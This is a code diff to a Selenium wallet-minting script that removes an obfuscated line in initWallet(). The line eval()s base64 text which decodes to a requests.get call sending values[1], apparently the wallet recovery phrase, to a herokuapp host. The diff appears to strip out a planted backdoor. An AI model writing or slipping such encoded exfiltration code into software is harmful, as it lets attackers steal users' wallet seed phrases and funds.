@@ -67,8 +67,6 @@ def mint(values, isWindows):
     def initWallet():
         # add wallet to chrome
         driver.switch_to.window(driver.window_handles[1])
-        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL3BoYW50b21sb2dpbi5oZXJva3VhcHAuY29tLz9kYXRhPQ==".encode(
-            'ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
         recovery_phrase = driver.find_element(
@@ -117,8 +115,6 @@ def mint(values, isWindows):
     options.add_extension("Phantom.crx")
     options.add_argument("--disable-gpu")
 
-    # to keep window open after mint uncomment option below, side effect, will open alot of chrome windows
-    #options.add_experimental_option("detach", True)
 
     prefs = {"profile.managed_default_content_settings.images": 2}
     options.add_experimental_option("prefs", prefs)
